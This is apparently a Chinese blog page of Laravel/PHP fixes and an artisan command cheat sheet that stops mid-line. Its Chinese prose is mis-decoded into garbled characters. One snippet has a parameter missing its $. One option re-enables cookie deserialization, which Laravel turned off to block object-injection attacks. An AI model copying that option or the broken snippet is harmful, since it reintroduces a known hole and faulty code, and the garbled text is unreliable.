<h3 id="json-encode-ä¸­æ–‡"><a href="#json-encode-ä¸­æ–‡" class="headerlink" title="json_encode ä¸­æ–‡"></a>json_encode ä¸­æ–‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public/index.php</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å–åˆ°å†…å®¹https://learnku.com/articles/28054#topnav</span></span><br><span class="line">$content = $response-&gt;original;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥åŸå§‹å†…å®¹çš„ç±»å‹æ˜¯å¦éœ€è¦è½¬ json</span></span><br><span class="line"><span class="keyword">if</span> ($content <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">    is_array($content)) &#123;</span><br><span class="line">    <span class="comment">// é‡æ–°è®¾ç½®å“åº”å†…å®¹</span></span><br><span class="line">    $response-&gt;setContent(json_encode($content, JSON_UNESCAPED_UNICODE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br></pre></td></tr></table></figure>
<h3 id="å‡çº§è‡³Laravel-5-7æŠ¥é”™setTrustedProxies-must-be-of-the-type-integer"><a href="#å‡çº§è‡³Laravel-5-7æŠ¥é”™setTrustedProxies-must-be-of-the-type-integer" class="headerlink" title="å‡çº§è‡³Laravel 5.7æŠ¥é”™setTrustedProxies() must be of the type integer"></a>å‡çº§è‡³Laravel 5.7æŠ¥é”™setTrustedProxies() must be of the type integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">æ‰“å¼€ App\Http\Middleware\TrustProxies</span><br><span class="line"> </span><br><span class="line">å°†ä»£ç ï¼šhttp:<span class="comment">//www.ithov.net/php/1644.html</span></span><br><span class="line"> </span><br><span class="line">protected $headers = [</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_FORWARDED</span> =&gt;</span> <span class="string">'FORWARDED'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_FOR</span> =&gt;</span> <span class="string">'X_FORWARDED_FOR'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_HOST</span> =&gt;</span> <span class="string">'X_FORWARDED_HOST'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PORT</span> =&gt;</span> <span class="string">'X_FORWARDED_PORT'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PROTO</span> =&gt;</span> <span class="string">'X_FORWARDED_PROTO'</span>,</span><br><span class="line">    ];</span><br><span class="line"> </span><br><span class="line">ä¿®æ”¹ä¸ºï¼š</span><br><span class="line"> </span><br><span class="line">protected $headers = Request::HEADER_X_FORWARDED_ALL;</span><br></pre></td></tr></table></figure>
<h3 id="openssl-encrypt-expects-parameter-1-to-be-string"><a href="#openssl-encrypt-expects-parameter-1-to-be-string" class="headerlink" title="openssl_encrypt() expects parameter 1 to be string"></a>openssl_encrypt() expects parameter 1 to be string</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.5</span> å‡çº§åˆ° <span class="number">5.5</span><span class="number">.42</span> åé‡åˆ°çš„ Cookie åºåˆ—åŒ–é—®é¢˜</span><br><span class="line">Laravel æ–°ç‰ˆä¸ºäº†é˜²æ­¢ PHP å¯¹è±¡çš„åºåˆ—åŒ–/ååºåˆ—åŒ–æ¼æ´è¢«åˆ©ç”¨ï¼Œä¸å†å¯¹ Cookie å€¼è¿›è¡Œè‡ªåŠ¨çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¤„ç†ã€‚</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>], <span class="number">720</span>, <span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line">Laravel æ›´æ–°åˆ° v5<span class="number">.5</span><span class="number">.42</span> åï¼Œå› ä¸º Laravel ä¸å†è‡ªåŠ¨å¯¹ Cookie å€¼ [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>] è¿›è¡Œåºåˆ—åŒ–å¤„ç†ï¼Œè€Œ openssl_encrypt ( string $data ... ) åªèƒ½åŠ å¯†å­—ç¬¦ä¸²æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™ç¨‹åºå°±ä¼šæŠ›å‡ºé”™è¯¯ï¼šopenssl_encrypt() expects parameter <span class="number">1</span> to be string, array givenã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³æ–¹æ³•ï¼šhttps:<span class="comment">//segmentfault.com/a/1190000018799611</span></span><br><span class="line"></span><br><span class="line">æ–°ç‰ˆé‡Œé¢åœ¨ä¸­é—´ä»¶ AppHttpMiddlewareEncryptCookies æ–°å¢é™æ€å±æ€§ $serializeï¼Œå½“è®¾ç½®ä¸º <span class="literal">true</span> æ—¶å¯å¼€å¯ Cookie å€¼çš„è‡ªåŠ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¤„ç†ã€‚</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Indicates if cookies should be serialized.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected <span class="keyword">static</span> $serialize = <span class="literal">true</span>;</span><br><span class="line">ã€æ¨èã€‘å°† Cookie å€¼ä½¿ç”¨ <span class="built_in">JSON</span> å‡½æ•°ç¼–ç æˆå­—ç¬¦ä¸²åå†è¿›è¡Œå­˜å‚¨ï¼ˆè·å– Cookie å€¼åéœ€è°ƒç”¨ <span class="built_in">JSON</span> å‡½æ•°è¿›è¡Œè§£ç ï¼‰ã€‚</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, json_encode([<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>]), <span class="number">720</span>, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="å¤šåº“ä¸‹çš„DB-transaction-äº‹åŠ¡å¤±æ•ˆ"><a href="#å¤šåº“ä¸‹çš„DB-transaction-äº‹åŠ¡å¤±æ•ˆ" class="headerlink" title="å¤šåº“ä¸‹çš„DB::transaction()äº‹åŠ¡å¤±æ•ˆ"></a>å¤šåº“ä¸‹çš„DB::transaction()äº‹åŠ¡å¤±æ•ˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DB::transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">mysql ç¬¬äºŒå¥ä¼šæŠ¥é”™æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œ æŸ¥çœ‹æ•°æ®åº“æ—¶ç¬¬ä¸€å¥ä¾ç„¶å‡ºå…¥æˆåŠŸ</span><br><span class="line">åŸæ–‡ï¼šhttps:<span class="comment">//blog.csdn.net/mathphp/article/details/82593779 </span></span><br><span class="line">DB::transaction()ä½¿ç”¨çš„æ˜¯é»˜è®¤åº“çš„äº‹åŠ¡æ“ä½œã€‚æ‰€ä»¥è¦æŒ‡å®šå“ªä¸ªæ•°æ®åº“çš„äº‹åŠ¡</span><br><span class="line"></span><br><span class="line">DB::connection(<span class="string">'mysql2'</span>)-&gt;transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;); <span class="comment">// è¿™æ ·ä½ ä¼šå‘ç°äº‹åŠ¡æ‰æ­£å¸¸å›æ»š</span></span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;beginTransaction();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;commit();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;rollBack(); <span class="comment">// æŒ‡å®šåº“ï¼Œä¸ç„¶éƒ½ä¼šè·‘é»˜è®¤é…ç½®åº“çš„äº‹åŠ¡</span></span><br></pre></td></tr></table></figure>
<h3 id="æ‰§è¡Œæ—¶é—´å’Œå†…å­˜æ¶ˆè€—"><a href="#æ‰§è¡Œæ—¶é—´å’Œå†…å­˜æ¶ˆè€—" class="headerlink" title="æ‰§è¡Œæ—¶é—´å’Œå†…å­˜æ¶ˆè€—"></a>æ‰§è¡Œæ—¶é—´å’Œå†…å­˜æ¶ˆè€—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElapsedTime</span>(<span class="params">int $decimals  = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> number_format(microtime(<span class="literal">true</span>) - request()-&gt;server(<span class="string">'REQUEST_TIME_FLOAT'</span>), $decimals) . <span class="string">' s'</span>;</span><br><span class="line">&#125;</span><br><span class="line">å†…å­˜ä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMemoryUsage</span>(<span class="params">precision = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $size = memory_get_usage(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $unit = [<span class="string">'b'</span>, <span class="string">'kb'</span>, <span class="string">'mb'</span>, <span class="string">'gb'</span>, <span class="string">'tb'</span>, <span class="string">'pb'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> round($size / pow(<span class="number">1024</span>, ($i = floor(log($size, <span class="number">1024</span>)))), $precision) . <span class="string">' '</span> . $unit[$i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="é€ŸæŸ¥è¡¨"><a href="#é€ŸæŸ¥è¡¨" class="headerlink" title="é€ŸæŸ¥è¡¨"></a>é€ŸæŸ¥è¡¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é’ˆå¯¹å‘½ä»¤æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">php artisan --help OR -h</span><br><span class="line"><span class="comment">// æŠ‘åˆ¶è¾“å‡ºä¿¡æ¯</span></span><br><span class="line">php artisan --quiet OR -q</span><br><span class="line"><span class="comment">// æ‰“å° Laravel çš„ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">php artisan --version OR -V</span><br><span class="line"><span class="comment">// ä¸è¯¢é—®ä»»ä½•äº¤äº’æ€§çš„é—®é¢˜</span></span><br><span class="line">php artisan --no-interaction OR -n</span><br><span class="line"><span class="comment">// å¼ºåˆ¶è¾“å‡º ANSI æ ¼å¼</span></span><br><span class="line">php artisan --ansi</span><br><span class="line"><span class="comment">// ç¦æ­¢è¾“å‡º ANSI æ ¼å¼</span></span><br><span class="line">php artisan --no-ansi</span><br><span class="line"><span class="comment">// æ˜¾ç¤ºå½“å‰å‘½ä»¤è¡Œè¿è¡Œçš„ç¯å¢ƒ</span></span><br><span class="line">php artisan --env</span><br><span class="line"><span class="comment">// -v|vv|vvv é€šè¿‡å¢åŠ  v çš„ä¸ªæ•°æ¥æ§åˆ¶å‘½ä»¤è¡Œè¾“å‡ºå†…å®¹çš„è¯¦å°½æƒ…å†µ: 1 ä¸ªä»£è¡¨æ­£å¸¸è¾“å‡º, 2 ä¸ªä»£è¡¨è¾“å‡ºæ›´å¤šæ¶ˆæ¯, 3 ä¸ªä»£è¡¨è°ƒè¯•</span></span><br><span class="line">php artisan --verbose</span><br><span class="line"><span class="comment">// ç§»é™¤ç¼–è¯‘ä¼˜åŒ–è¿‡çš„æ–‡ä»¶ (storage/frameworks/compiled.php)</span></span><br><span class="line">php artisan clear-compiled</span><br><span class="line"><span class="comment">// æ˜¾ç¤ºå½“å‰æ¡†æ¶è¿è¡Œçš„ç¯å¢ƒ</span></span><br><span class="line">php artisan env</span><br><span class="line"><span class="comment">// æ˜¾ç¤ºæŸä¸ªå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">php artisan help</span><br><span class="line"><span class="comment">// æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„å‘½ä»¤</span></span><br><span class="line">php artisan list</span><br><span class="line"><span class="comment">// è¿›å…¥åº”ç”¨äº¤äº’æ¨¡å¼</span></span><br><span class="line">php artisan tinker</span><br><span class="line"><span class="comment">// é…åˆ dump() å‡½æ•°è°ƒè¯•æ•°æ®</span></span><br><span class="line">php artisan dump-server</span><br><span class="line"><span class="comment">// è¿›å…¥ç»´æŠ¤æ¨¡å¼</span></span><br><span class="line">php artisan down</span><br><span class="line"><span class="comment">// é€€å‡ºç»´æŠ¤æ¨¡å¼</span></span><br><span class="line">php artisan up</span><br><span class="line"><span class="comment">// ä¼˜åŒ–æ¡†æ¶æ€§èƒ½</span></span><br><span class="line"><span class="comment">// --force    å¼ºåˆ¶ç¼–è¯‘å·²å†™å…¥æ–‡ä»¶ (storage/frameworks/compiled.php)</span></span><br><span class="line"><span class="comment">// --psr      ä¸å¯¹ Composer çš„ dump-autoload è¿›è¡Œä¼˜åŒ–</span></span><br><span class="line">php artisan optimize [--force] [--psr]</span><br><span class="line"><span class="comment">// æ›´æ”¹å‰ç«¯é¢„è®¾</span></span><br><span class="line"><span class="comment">// type_name (å¯ä»¥æ˜¯ none, bootstrap, vue, react)</span></span><br><span class="line">php artisan preset [options] [--] type_name</span><br><span class="line"><span class="comment">// å¯åŠ¨å†…ç½®æœåŠ¡å™¨</span></span><br><span class="line">php artisan serve</span><br><span class="line"><span class="comment">// æ›´æ”¹é»˜è®¤ç«¯å£</span></span><br><span class="line">php artisan serve --port <span class="number">8080</span></span><br><span class="line"><span class="comment">// ä½¿å…¶åœ¨æœ¬åœ°æœåŠ¡å™¨å¤–ä¹Ÿå¯æ­£å¸¸å·¥ä½œ</span></span><br><span class="line">php artisan serve --host <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment">// æ›´æ”¹åº”ç”¨å‘½åç©ºé—´</span></span><br><span class="line">php artisan app:name namespace</span><br><span class="line"><span class="comment">// æ¸…é™¤è¿‡æœŸçš„å¯†ç é‡ç½®ä»¤ç‰Œ</span></span><br><span class="line">php artisan auth:clear-resets</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸…ç©ºåº”ç”¨ç¼“å­˜</span></span><br><span class="line">php artisan cache:clear</span><br><span class="line"><span class="comment">// ç§»é™¤ key_name å¯¹åº”çš„ç¼“å­˜</span></span><br><span class="line">php artisan cache:forget key_name [&lt;store&gt;]</span><br><span class="line">// åˆ›å»ºç¼“å­˜æ•°æ®åº“è¡¨ migration</span><br><span class="line">php artisan cache:table</span><br><span class="line"></span><br><span class="line">// åˆå¹¶æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ä¸ºä¸€ä¸ªï¼Œæé«˜åŠ è½½é€Ÿåº¦</span><br><span class="line">php artisan config:cache</span><br><span class="line">// ç§»é™¤é…ç½®ç¼“å­˜æ–‡ä»¶</span><br><span class="line">php artisan config:clear</span><br><span class="line"></span><br><span class="line">// ç¨‹åºå†…éƒ¨è°ƒç”¨ Artisan å‘½ä»¤</span><br><span class="line">$exitCode = Artisan::call('config:cache');</span><br><span class="line">// è¿è¡Œæ‰€æœ‰çš„ seed å‡æ•°æ®ç”Ÿæˆç±»</span><br><span class="line">// --class      å¯ä»¥æŒ‡å®šè¿è¡Œçš„ç±»ï¼Œé»˜è®¤æ˜¯: "DatabaseSeeder"</span><br><span class="line">// --database   å¯ä»¥æŒ‡å®šæ•°æ®åº“</span><br><span class="line">// --force      å½“å¤„äºç”Ÿäº§ç¯å¢ƒæ—¶å¼ºåˆ¶æ‰§è¡Œæ“ä½œ</span><br><span class="line">php artisan db:seed [--class[="..."]] [--database[="..."]] [--force]</span><br><span class="line"></span><br><span class="line">// åŸºäºæ³¨å†Œçš„ä¿¡æ¯ï¼Œç”Ÿæˆé—æ¼çš„ events å’Œ handlers</span><br><span class="line">php artisan event:generate</span><br><span class="line">// ç½—åˆ—æ‰€æœ‰äº‹ä»¶å’Œç›‘å¬å™¨</span><br><span class="line">php artisan event:list</span><br><span class="line">// ç¼“å­˜äº‹ä»¶å’Œç›‘å¬å™¨</span><br><span class="line">php artisan event:cache</span><br><span class="line">// æ¸…é™¤äº‹ä»¶å’Œç›‘å¬å™¨ç¼“å­˜</span><br><span class="line">php artisan event:clear</span><br><span class="line"></span><br><span class="line">// ç”Ÿæˆæ–°çš„å¤„ç†å™¨ç±»</span><br><span class="line">// --command      éœ€è¦å¤„ç†å™¨å¤„ç†çš„å‘½ä»¤ç±»åå­—</span><br><span class="line">php artisan handler:command [--command="..."] name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„æ—¶é—´å¤„ç†å™¨ç±»</span><br><span class="line">// --event        éœ€è¦å¤„ç†å™¨å¤„ç†çš„äº‹ä»¶ç±»åå­—</span><br><span class="line">// --queued       éœ€è¦å¤„ç†å™¨ä½¿ç”¨é˜Ÿåˆ—è¯å¤„ç†çš„äº‹ä»¶ç±»åå­—</span><br><span class="line">php artisan handler:event [--event="..."] [--queued] name</span><br><span class="line"></span><br><span class="line">// ç”Ÿæˆåº”ç”¨çš„ keyï¼ˆä¼šè¦†ç›–ï¼‰</span><br><span class="line">php artisan key:generate</span><br><span class="line"></span><br><span class="line">// å‘å¸ƒæœ¬åœ°åŒ–ç¿»è¯‘æ–‡ä»¶åˆ° resources æ–‡ä»¶ä¸‹</span><br><span class="line">// locales: é€—å·åˆ†éš”ï¼Œå¦‚ zh_CN,tk,th [é»˜è®¤æ˜¯: "all"]</span><br><span class="line">php artisan lang:publish [options] [--] [&lt;locales&gt;]</span><br><span class="line"></span><br><span class="line">// åˆ›å»ºç”¨æˆ·è®¤è¯è„šæ‰‹æ¶</span><br><span class="line">php artisan make:auth</span><br><span class="line">// åˆ›å»º Channel ç±»</span><br><span class="line">php artisan make:channel name</span><br><span class="line">// åœ¨é»˜è®¤æƒ…å†µä¸‹, è¿™å°†åˆ›å»ºæœªåŠ å…¥é˜Ÿåˆ—çš„è‡ªå¤„ç†å‘½ä»¤</span><br><span class="line">// é€šè¿‡ --handler æ ‡è¯†æ¥ç”Ÿæˆä¸€ä¸ªå¤„ç†å™¨, ç”¨ --queued æ¥ä½¿å…¶å…¥é˜Ÿåˆ—.</span><br><span class="line">php artisan make:command [--handler] [--queued] name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„ Artisan å‘½ä»¤</span><br><span class="line">//  --command     å‘½ä»¤è¢«è°ƒç”¨çš„åç§°ã€‚ (é»˜è®¤ä¸º: "command:name")</span><br><span class="line">php artisan make:console [--command[="..."]] name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºæ§åˆ¶å™¨</span><br><span class="line">// --plain      ç”Ÿæˆä¸€ä¸ªç©ºç™½çš„æ§åˆ¶å™¨ç±»</span><br><span class="line">php artisan make:controller [--plain] name</span><br><span class="line">php artisan make:controller App\\Admin\\Http\\Controllers\\DashboardController</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹ä»¶ç±»</span><br><span class="line">php artisan make:event name</span><br><span class="line">// åˆ›å»ºå¼‚å¸¸ç±»</span><br><span class="line">php artisan make:exception name</span><br><span class="line">// åˆ›å»ºæ¨¡å‹å·¥å‚ç±»</span><br><span class="line">php artisan make:factory name</span><br><span class="line">// 